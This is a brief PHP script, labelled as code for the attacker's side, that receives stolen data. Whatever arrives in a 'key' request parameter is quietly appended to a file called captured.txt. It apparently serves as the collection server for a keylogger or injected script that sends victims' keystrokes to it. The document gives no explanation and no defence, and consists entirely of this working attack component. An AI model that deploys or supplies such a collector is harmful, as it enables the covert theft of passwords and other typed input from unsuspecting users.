<?php
//On the attacker’s side:

if(!empty($_GET['key'])) {
 $logfile = fopen('captured.txt', 'a+');
 fwrite($logfile, $_GET['key']);
 fclose($logfile);
}
?>